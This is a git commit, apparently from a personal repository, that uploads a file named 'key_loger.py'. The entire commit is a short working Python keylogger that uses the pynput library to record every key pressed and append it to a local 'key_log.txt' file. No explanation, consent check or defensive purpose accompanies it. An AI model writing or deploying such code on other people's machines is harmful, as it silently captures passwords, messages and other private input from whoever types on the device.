92f9858ad8f7d0edb57b4c092433d305d23c071c
Subham Kumar Betal <subhamkumarbetal2010@gmail.com>
2026-05-02 20:20:28 +0530

    Add files via upload

---
+++ key_loger.py
@@ -0,0 +1,15 @@
+from pynput.keyboard import Listener 
+log_file = "key_log.txt"
+
+def on_press(key):
+    with open(log_file,"a") as f:
+        try:
+            f.write(f"{key.char}")
+        except AttributeError:
+            f.write(f"[{key}]")
+
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+        
